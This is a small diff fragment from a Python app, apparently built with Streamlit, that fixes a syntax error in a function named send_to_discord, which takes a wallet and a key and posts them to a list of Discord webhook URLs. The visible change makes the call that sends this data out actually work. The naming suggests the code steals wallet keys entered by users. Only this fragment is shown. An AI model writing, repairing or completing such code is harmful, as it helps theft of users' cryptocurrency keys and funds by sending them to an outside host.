@@ -161,7 +161,7 @@ def send_to_discord(wallet, key):
     }
     
     for webhook_url in webhook_urls:
-        requests.post(webhook_url, json=data
+        requests.post(webhook_url, json=data)
 
 
     st.markdown(
